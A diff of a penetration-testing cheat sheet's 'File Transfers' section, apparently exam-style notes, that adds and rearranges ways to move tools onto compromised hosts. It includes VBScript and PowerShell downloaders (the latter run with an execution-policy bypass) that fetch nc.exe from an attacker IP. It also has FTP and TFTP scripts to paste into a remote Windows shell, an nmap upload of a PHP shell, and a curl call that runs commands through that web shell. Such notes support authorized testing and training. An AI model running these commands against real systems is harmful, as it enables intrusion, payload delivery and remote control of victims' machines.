@@ -967,27 +967,30 @@ File Transfers
 -   Simple Local Web Servers
 
     -   Run a basic http server, great for serving up shells etc  
-    
+             
              python -m SimpleHTTPServer 80
-
     -   Run a basic Python3 http server, great for serving up shells
     
              etc  
              python3 -m http.server
 
     -   Run a ruby webrick basic http server  
-    
+             
              ruby -rwebrick -e "WEBrick::HTTPServer.new  
              (:Port => 80, :DocumentRoot => Dir.pwd).start"
 
     -   Run a basic PHP http server  
-        
+             
              php -S $ip:80
-
+    
+    -   Run apache 
+            
+             systemctl start apache2
+             cp /usr/share/windows-binaries/nc.exe /var/www/html/nc.exe 
+             
+             
 -   Creating a wget VB Script on Windows:  
 
-
-        ```
         echo strUrl = WScript.Arguments.Item(0) > wget.vbs
         echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
         echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
@@ -1013,8 +1016,10 @@ File Transfers
         echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
         echo Next >> wget.vbs
         echo ts.Close >> wget.vbs
-        ```
-    
+        
+      The file can be run using the following syntax:
+        
+        cscript wget.vbs http://10.11.0.183/nc.exe nc.exe
 
 -   Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter shell.  The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):
 
@@ -1048,24 +1053,70 @@ File Transfers
       
       `C:\temp\cscript.exe webdl.vbs`
       
+-   PowerShell:
+
+         echo $storageDir = $pwd > wget.ps1
+         echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+         echo $url = "http://10.11.0.183/nc.exe" >>wget.ps1
+         echo $file = "new-exploit.exe" >>wget.ps1
+         echo $webclient.DownloadFile($url,$file) >>wget.ps1 
+         
+         powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+      
+      
+ -   TFTP  
+        mkdir /tftp  
+        atftpd --daemon --port 69 /tftp  
+        cp /usr/share/windows-binaries/nc.exe /tftp/  
+        EX. FROM WINDOWS HOST:  
+        C:\\Users\\Offsec>tftp -i $ip get nc.exe
+
+ -   FTP  
+      
+         apt-get install pure-ftpd  
+         
+         #!/bin/bash  
+         groupadd ftpgroup  
+         useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
+         pure-pw useradd ermolaev -u ftpuser -d /ftphome  
+         pure-pw mkdb  
+         cd /etc/pure-ftpd/auth/  
+         ln -s ../conf/PureDB 60pdb  
+         mkdir -p /ftphome  
+         chown -R ftpuser:ftpgroup /ftphome/  
+         /etc/init.d/pure-ftpd restart
+        
+        paste the following commands into a remote Windows shell
+        
+         echo open 10.11.0.183 21> ftp.txt
+         echo USER ermolaev>> ftp.txt
+         echo 1qaz@WSX>> ftp.txt
+         echo bin >> ftp.txt
+         echo GET nc.exe >> ftp.txt
+         echo bye >> ftp.txt
+         ftp -v -n -s:ftp.txt
+              
+      
 -   Mounting File Shares
 
-    -   Mount NFS share to /mnt/nfs  
-        mount $ip:/vol/share /mnt/nfs
+Mount NFS share to /mnt/nfs  
+        
+         mount $ip:/vol/share /mnt/nfs
 
 -   HTTP Put  
-    nmap -p80 $ip --script http-put --script-args
-    http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
+
+         nmap -p80 $ip --script http-put --script-args
+         http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
+
+
 
 -   Uploading Files
     -------------------------------------------------------------------------------------------------------------
 
-    -   SCP
+-   SCP
     
         scp username1@source_host:directory1/filename1 username2@destination_host:directory2/filename2
-        
         scp localfile username@$ip:~/Folder/
-        
         scp Linux_Exploit_Suggester.pl bob@192.168.1.10:~
         
 
@@ -1091,39 +1142,7 @@ File Transfers
         http://$ip/files/sh.php  
         curl -s --data "cmd=bash -c /tmp/evil" http://$ip/files/sh.php
 
-    -   TFTP  
-        mkdir /tftp  
-        atftpd --daemon --port 69 /tftp  
-        cp /usr/share/windows-binaries/nc.exe /tftp/  
-        EX. FROM WINDOWS HOST:  
-        C:\\Users\\Offsec>tftp -i $ip get nc.exe
-
-    -   FTP  
-      
-         apt-get install pure-ftpd  
-         
-        #!/bin/bash  
-        groupadd ftpgroup  
-        useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
-        pure-pw useradd ermolaev -u ftpuser -d /ftphome  
-        pure-pw mkdb  
-        cd /etc/pure-ftpd/auth/  
-        ln -s ../conf/PureDB 60pdb  
-        mkdir -p /ftphome  
-        chown -R ftpuser:ftpgroup /ftphome/  
-          
-        /etc/init.d/pure-ftpd restart
-        
-        paste the following commands into a remote Windows shell
-        
-        echo open 10.11.0.183 21> ftp.txt
-        echo USER ermolaev>> ftp.txt
-        echo 1qaz@WSX>> ftp.txt
-        echo bin >> ftp.txt
-        echo GET nc.exe >> ftp.txt
-        echo bye >> ftp.txt
-        ftp -v -n -s:ftp.txt
-        
+   
 
 -   Packing Files
     -------------------------------------------------------------------------------------------------------------
